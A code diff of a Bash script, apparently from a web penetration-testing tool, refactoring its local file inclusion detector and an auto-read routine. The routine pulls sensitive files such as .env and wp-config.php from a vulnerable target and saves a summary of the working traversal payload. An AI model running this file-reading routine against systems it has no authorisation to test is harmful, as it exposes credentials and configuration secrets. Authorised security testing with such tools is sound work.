@@ -177,11 +177,11 @@ detect_lfi() {
   IFS='|' read -r baseline_status baseline_size baseline_time <<< "$baseline_metrics"
 
   # ── STEP 2: LEVEL-BY-LEVEL TESTING ──
-  local confirmed=false best_payload="" best_confidence="" best_signals=0 best_signal_list="" best_proof="" best_encoding=""
+  local confirmed=false best_payload="" best_signals=0 best_signal_list="" best_proof="" best_encoding=""
   local consecutive_misses=0 requests_this_level=0
 
   _run_level() {
-    local level_name="$1" level_num="$2"
+    local level_name="$1" # $2=level_num (unused)
     shift 2
     consecutive_misses=0; requests_this_level=0
 
@@ -303,8 +303,12 @@ detect_lfi() {
     local next_steps; next_steps=$(suggest_next_step "lfi" "$framework" 2>/dev/null | head -3 | tr '\n' ' ') || true
 
     # JSON output
+    local _esc_payload="${best_payload//\"/\\\"}"
+    local _esc_proof="${best_proof//\"/\\\"}"
+    local _esc_curl="${curl_cmd//\"/\\\"}"
+    _esc_proof="${_esc_proof:0:100}"
     cat << LFIEOF
-{"type":"${prefix}lfi","url":"$url","param":"$param","method":"$method","depth":${found_depth:-0},"encoding":"$best_encoding","payload":"$(echo "$best_payload" | sed 's/"/\\"/g')","signal_count":$best_signals,"signals":"$best_signal_list","confidence":"$confidence","proof":"$(echo "$best_proof" | sed 's/"/\\"/g' | head -c 100)","curl":"$(echo "$curl_cmd" | sed 's/"/\\"/g')","next_steps":"$next_steps","framework":"$framework","waf":"$waf"}
+{"type":"${prefix}lfi","url":"$url","param":"$param","method":"$method","depth":${found_depth:-0},"encoding":"$best_encoding","payload":"${_esc_payload}","signal_count":$best_signals,"signals":"$best_signal_list","confidence":"$confidence","proof":"${_esc_proof}","curl":"${_esc_curl}","next_steps":"$next_steps","framework":"$framework","waf":"$waf"}
 LFIEOF
 
     # Terminal alert
@@ -361,10 +365,8 @@ _lfi_auto_read() {
     "var/www/html/.env"
     "var/www/html/wp-config.php"
   )
-  local -a targets_win=(
-    "windows/win.ini"
-    "windows/system32/drivers/etc/hosts"
-  )
+  # Windows targets (used if non-unix detected)
+  # local -a targets_win=("windows/win.ini" "windows/system32/drivers/etc/hosts")
 
   echo -e "\033[1;36m  ┌─── LFI Auto-Read Results ───────────────────────────\033[0m" >&2
   local files_read=0
@@ -376,7 +378,8 @@ _lfi_auto_read() {
 
   for target_file in "${all_targets[@]}"; do
     local payload="${bypass_prefix}${target_file}"
-    local resp_file="${lfi_reads_dir}/$(echo "$target_file" | tr '/' '_').txt"
+    local resp_file
+    resp_file="${lfi_reads_dir}/$(echo "$target_file" | tr '/' '_').txt"
     _lfi_request "$url" "$param" "$payload" "$method" "$resp_file" > /dev/null 2>&1
 
     local fsize=0
@@ -399,10 +402,12 @@ _lfi_auto_read() {
   echo -e "\033[1;36m  └─── ${files_read} files read ────────────────────────────\033[0m" >&2
 
   # Save summary
-  echo "LFI confirmed: $url ($param)" > "${lfi_reads_dir}/summary.txt"
-  echo "Working payload pattern: $bypass_prefix" >> "${lfi_reads_dir}/summary.txt"
-  echo "Files successfully read: $files_read" >> "${lfi_reads_dir}/summary.txt"
-  ls -la "$lfi_reads_dir"/*.txt 2>/dev/null | awk '{print $NF, $5 " bytes"}' >> "${lfi_reads_dir}/summary.txt"
+  {
+    echo "LFI confirmed: $url ($param)"
+    echo "Working payload pattern: $bypass_prefix"
+    echo "Files successfully read: $files_read"
+    find "$lfi_reads_dir" -name '*.txt' -printf '%p %s bytes\n' 2>/dev/null
+  } > "${lfi_reads_dir}/summary.txt"
 }
 
 # ── HTTP request helper (returns status|size|time) ──────────────────────────
